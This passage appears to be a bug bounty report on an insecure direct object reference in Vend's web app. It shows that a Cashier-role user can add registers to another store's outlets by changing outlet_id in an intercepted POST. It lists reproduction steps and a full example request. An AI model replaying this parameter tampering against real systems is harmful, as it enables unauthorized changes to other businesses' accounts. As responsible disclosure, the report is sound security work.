User with default `Cashier` role has no permission to add registers.  If a user creates his own store on `vendhq.com` then he can add a Register to an Outlet.\n\n## Steps To Reproduce:\n\n  1. Add a user to store A with `Cashier` role. Assume the added user's email is attacker@attacker.com\n  2. Go to `Setup` -\u003e `Outlets and Registers`\n  3. Create an outlet in store A\n  4. Create a new store B using email attacker@attacker.com\n  5. Log in to store B with attacker@attacker.com credentials\n  6. Create an outlet in store B\n  7. Run Burp Suite or any other proxy to intercept requests\n  8. Add a register to outlet in store B and intercept outgoing POST request\n  9. Replace id in `vend_register%5Boutlet_id%5D=\u003coutlet id\u003e` from the request with id of outlet from store A and process the request\n  10. Check outlet from store A - a register should be added to it\n\nRequest example\n\n```\nPOST /register/create/outlet_id/\u003coutled id from B\u003e HTTP/1.1\nHost: \u003cstore B\u003e.vendhq.com\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: https://\u003cstore B\u003e.vendhq.com/register/\u003coutled id from B\u003e/new?confirmed=1\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 694\nCookie: \u003cCookie\u003e\nDNT: 1\nConnection: close\nUpgrade-Insecure-Requests: 1\n\nvend_register%5Bid%5D=\u0026vend_register%5Boutlet_id%5D=\u003coutled id from A\u003e\u0026vend_register%5B_csrf_token%5D=\u003ccsrf token\u003e\u0026vend_register%5Bname%5D=6\u0026vend_register%5Bcash_managed_payment_id%5D=\u003ccash managed payment id\u003e\u0026vend_register%5Breceipt_template_id%5D=\u003creceipt template id\u003e\u0026vend_register%5Binvoice_sequence%5D=1\u0026vend_register%5Binvoice_prefix%5D=\u0026vend_register%5Binvoice_suffix%5D=\u0026vend_register%5Bask_for_user_on_sale%5D=0\u0026vend_register%5Bemail_receipt%5D=1\u0026vend_register%5Bprint_receipt%5D=1\u0026vend_register%5Bask_for_note_on_save%5D=1\u0026vend_register%5Bprint_note_on_receipt%5D=1\u0026vend_register%5Bshow_discounts%5D=1\u0026return=\n```\n\nCashier can get id of interesting outlet from `Sales Ledger` page source.\n\n## Impact\n\nAn attacker can add registers to outlets even if he has no permissions to do it.","vulnerability_information_html":"\u003cp\u003e\u003cstrong\u003eSummary:\u003c/strong\u003e User without permissions to add a Register to an Outlet can bypass this restriction and add a Register to an Outlet.\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003eDescription:\u003c/strong\u003e I do not know which permission exactly controls this action, I tested this against default \u003ccode\u003eCashier\u003c/code\u003e role.
